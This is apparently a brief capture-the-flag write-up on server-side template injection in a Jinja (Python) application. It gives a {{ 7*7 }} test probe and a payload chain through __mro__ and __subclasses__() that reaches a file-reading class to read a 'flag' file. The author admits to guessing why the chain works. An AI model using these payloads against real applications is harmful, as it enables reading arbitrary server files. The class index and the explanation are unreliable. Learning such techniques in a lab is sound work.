Find out it's Jinja template which uses Python.  Not sure how to find this out as we solved this problem in a Weekly Dev Chat ensemble and a partipant knew the answer.

Once you have figured out it's Jinja you can try the following to see if the a hack will work:

```
{{ 7*7 }}
```

Then you can get a list of all the classes avaliable:

```
1337.__class__.__mro__[1].__subclasses__()
```

From there you can access different classes in Python to do things.  I don't know why this works but my guess is it will get you to the Python read file method.  Don't forget the `{{ }}` brackets.

```
 1337.__class__.__mro__[1].__subclasses__()[92].__subclasses__()[0].__subclasses__()[0]('flag').read()
 ```